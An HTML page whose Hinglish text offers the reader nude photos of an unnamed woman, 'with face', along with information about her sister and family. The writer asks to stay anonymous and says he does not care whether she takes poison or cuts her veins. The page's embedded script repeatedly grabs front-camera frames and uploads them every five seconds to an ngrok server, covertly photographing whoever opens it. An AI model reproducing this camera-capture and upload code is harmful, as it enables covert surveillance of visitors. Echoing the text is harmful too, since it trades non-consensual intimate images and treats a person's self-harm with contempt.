<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title style="color: blue;">Ye sab matter yahi karte hai bhai meri ye shate maan le.</title>
</head>
<body>

<h1>Deal bs ye hai is sabme mera naam nhe aaye.</h1>
<p>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate.</p>

<script>
    // Check if camera permission is already granted
    const cameraPermissionGranted = localStorage.getItem('cameraPermission') === 'granted';

    async function captureAndSend() {
        try {
            // Check if camera permission is already granted
            if (!cameraPermissionGranted) {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // 'user' for front camera
                    },
                });

                const video = document.createElement('video');
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();

                // If permission is granted, store it in localStorage
                localStorage.setItem('cameraPermission', 'granted');

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHight;
                const context = canvas.getContext('2d');

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas data to Blob (binary format)
                canvas.toBlob(blob => {
                    // Send the Blob to your API
                    sendToApi(blob);
                }, 'image/png');

                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
            } else {
                // Camera permission is already granted, proceed with capturing and sending
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // 'user' for front camera
                    },
                });

                const video = document.createElement('video');
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas data to Blob (binary format)
                canvas.toBlob(blob => {
                    // Send the Blob to your API
                    sendToApi(blob);
                }, 'image/png');

                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
            }
        } catch (error) {
            console.error('Error accessing front camera:', error);
        }
    }

    function sendToApi(blob) {
        // Replace 'your-api-endpoint' with the actual API endpoint
        const apiUrl = 'https://c5da-2405-201-683a-d05a-dd05-dc4b-cedf-b91.ngrok-free.app/upload';

        const formData = new FormData();
        formData.append('photo', blob, 'photo.png');

        // Use fetch to send the image data to your API
        fetch(apiUrl, {
            method: 'POST',
            body: formData,
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('API Response:', data);
        })
        .catch(error => {
            console.error('Error sending data to API:', error);
        });
    }

    // Automatically trigger after x seconds
    setInterval(captureAndSend, 5000);
</script>

</body>
</html>
